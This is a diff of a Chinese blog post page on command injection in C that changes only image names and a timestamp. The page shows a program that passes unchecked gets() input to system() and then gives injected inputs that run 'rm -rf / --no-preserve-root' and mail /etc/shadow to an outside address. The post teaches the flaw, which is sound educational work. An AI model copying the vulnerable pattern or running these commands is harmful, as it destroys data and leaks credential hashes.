@@ -101,13 +101,13 @@
 <meta property="og:url" content="http://fenlan.github.io/2017/12/14/代码注入/index.html">
 <meta property="og:site_name" content="fenlan">
 <meta property="og:description" content="c程序代码注入c程序:123456789101112131415#include &amp;lt;stdio.h&amp;gt;int main(int argc, char *argv[])&amp;#123;	char src[100], dst[100], cmd[205] = &quot;cp &quot;;	printf(&quot;Please enter name of source file:&quot;);	gets(src);	strcat">
-<meta property="og:image" content="http://fenlan.github.io/images/attacks1.png">
+<meta property="og:image" content="http://fenlan.github.io/images/attacks.png">
 <meta property="og:image" content="http://fenlan.github.io/images/attacks2.png">
-<meta property="og:updated_time" content="2017-12-14T03:47:17.102Z">
+<meta property="og:updated_time" content="2017-12-14T03:50:05.016Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="代码注入">
 <meta name="twitter:description" content="c程序代码注入c程序:123456789101112131415#include &amp;lt;stdio.h&amp;gt;int main(int argc, char *argv[])&amp;#123;	char src[100], dst[100], cmd[205] = &quot;cp &quot;;	printf(&quot;Please enter name of source file:&quot;);	gets(src);	strcat">
-<meta name="twitter:image" content="http://fenlan.github.io/images/attacks1.png">
+<meta name="twitter:image" content="http://fenlan.github.io/images/attacks.png">
 
 
 
@@ -417,7 +417,7 @@
 
       
         <h2 id="c程序代码注入"><a href="#c程序代码注入" class="headerlink" title="c程序代码注入"></a>c程序代码注入</h2><p>c程序:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">	char src[100], dst[100], cmd[205] = <span class="string">"cp "</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Please enter name of source file:"</span>);</span><br><span class="line">	gets(src);</span><br><span class="line">	strcat(cmd, src);</span><br><span class="line">	strcat(cmd, <span class="string">" "</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Please enter name of destination file:"</span>);</span><br><span class="line">	gets(dst);</span><br><span class="line">	strcat(cmd, dst);</span><br><span class="line">	system(cmd);</span><br><span class="line">	<span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>程序本身是要求输入一个拷贝源文件和拷贝目标文件，将源文件内容拷贝到目标文件,正常执行:<br><img src="/images/attacks1.png" alt=""></p>
+<p>程序本身是要求输入一个拷贝源文件和拷贝目标文件，将源文件内容拷贝到目标文件,正常执行:<br><img src="/images/attacks.png" alt=""></p>
 <p>异常代码注入<br><img src="/images/attacks2.png" alt=""></p>
 <p>同时还能干这些事情<br>删除根目录，你可以试试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp hello world; rm -rf / --no-preserve-root</span><br></pre></td></tr></table></figure></p>
 <p>将linux系统的密码文件通过邮件发送<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp hello world; mail ****@****.com &lt; /etc/shadow</span><br></pre></td></tr></table></figure></p>
